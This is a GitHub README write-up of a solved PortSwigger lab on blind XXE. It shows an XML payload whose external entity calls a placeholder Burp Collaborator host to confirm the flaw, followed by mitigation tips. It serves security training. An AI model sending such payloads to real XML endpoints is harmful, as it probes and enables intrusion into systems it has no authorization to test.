
### 📁 `README.md` — Blind XXE via OOB Interaction


# 🌐 Blind XXE via Out-of-Band (OOB) Interaction

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** Blind XML External Entity (XXE)  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Use Blind XXE to trigger an OOB DNS/HTTP request to Burp Collaborator and confirm vulnerability.

---

## 🔍 Lab Summary

This lab simulates a real-world **blind XXE** scenario, where:
- The application parses XML.
- There’s **no output** in the HTTP response.
- But the **server reacts** to external entity resolution.

The goal is to trigger a **DNS or HTTP interaction** with a **Burp Collaborator** subdomain to prove that the XML parser is vulnerable.

---

## ⚙️ Exploitation Steps

### 1. 🕵️ Intercept the Request

Navigate to any product page and click **Check stock**.  
In **Burp Suite**, intercept the POST request, which looks like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
````

---

### 2. 🧨 Inject the External Entity (Blind OOB XXE)

Replace the payload with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

> 💡 Tip: In Burp Suite Pro, right-click → "Insert Collaborator payload" to automatically insert a valid Burp subdomain.

---

### 3. 🔍 Monitor the Interaction

Go to the **"Burp Collaborator"** tab and click **"Poll now"**.
You should see **DNS and HTTP interactions** from the vulnerable server — confirming it resolved your external entity.
![XXE](https://github.com/Kabilala/xxe/blob/main/lab3/lab3.png)
---

## 🧠 Technical Breakdown

| Component                                   | Purpose                                              |
| ------------------------------------------- | ---------------------------------------------------- |
| `<!DOCTYPE>`                                | Declares a DTD                                       |
| `<!ENTITY xxe SYSTEM "http://[subdomain]">` | Defines an external entity that triggers a request   |
| `&xxe;`                                     | Injects the entity into the XML body                 |
| OOB                                         | The server reaches out to your Burp Collaborator URL |

---

## 🛡️ Mitigation Techniques

* **Disable DTD processing** in your XML parsers
* **Use secure parsers** (e.g., `defusedxml`, Java’s `SAXParserFactory.setFeature`)
* **Monitor for unexpected outbound traffic**
* Apply **least privilege** for network access

---

## 📚 References

* [📘 PortSwigger XXE Labs](https://portswigger.net/web-security/xxe/blind)
* [🧠 OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [📖 Burp Suite Collaborator Guide](https://portswigger.net/burp/documentation/collaborator)

---
